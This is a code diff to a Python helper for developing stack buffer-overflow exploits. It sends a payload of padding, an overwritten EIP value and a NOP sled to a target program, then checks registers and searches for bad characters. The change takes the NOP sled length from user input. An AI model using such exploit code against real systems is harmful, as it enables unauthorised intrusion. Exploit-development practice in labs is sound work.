@@ -30,7 +30,10 @@ def run_expl(args):
     program.restart()
 
     threading.Thread(target=program.run_program()).start()
-    threading.Thread(target=program.exploit(prefix, "\x41"*offset, new_eip, 16*"\x90", b'', "")).start()
+    
+    #TODO: I have to calculate that "offset" instead of getting from user !!!
+
+    threading.Thread(target=program.exploit(prefix, "\x41"*offset, new_eip, int(args["offset"])*"\x90", b'', "")).start()
 
     current_eip = program.get_register_value("eip")
 
@@ -39,7 +42,7 @@ def run_expl(args):
         exit(1)
 
     find_bad_chars = FindBadchars(prefix, offset, new_eip, program, args["ip"], int(args["port"]))
-    bad_chars = find_bad_chars.find_badchars()
+    bad_chars = find_bad_chars.find_badchars(int(args["offset"]))
 
 
     int_badchars = []
